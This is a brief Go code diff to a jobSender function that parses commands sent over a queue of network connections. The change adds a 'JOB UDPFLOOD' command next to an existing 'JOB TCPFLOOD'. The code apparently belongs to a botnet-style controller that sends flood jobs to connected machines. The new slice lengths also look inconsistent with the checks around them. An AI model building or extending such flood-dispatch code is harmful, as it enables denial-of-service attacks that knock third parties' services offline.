@@ -57,7 +57,9 @@ func jobSender(mutex *sync.Mutex, queue *[]net.Conn) {
 				} else if query[:8] == "JOB TIME" {
 					smallQuery = query[:8]
 				} else if query[:12] == "JOB TCPFLOOD" {
-					smallQuery = query[:12]
+					smallQuery = query[:13]
+				} else if query[:12] == "JOB UDPFLOOD" {
+					smallQuery = query[:13]
 				} else {
 					fmt.Println("invalid query, please use proper protocol standards")
 					continue
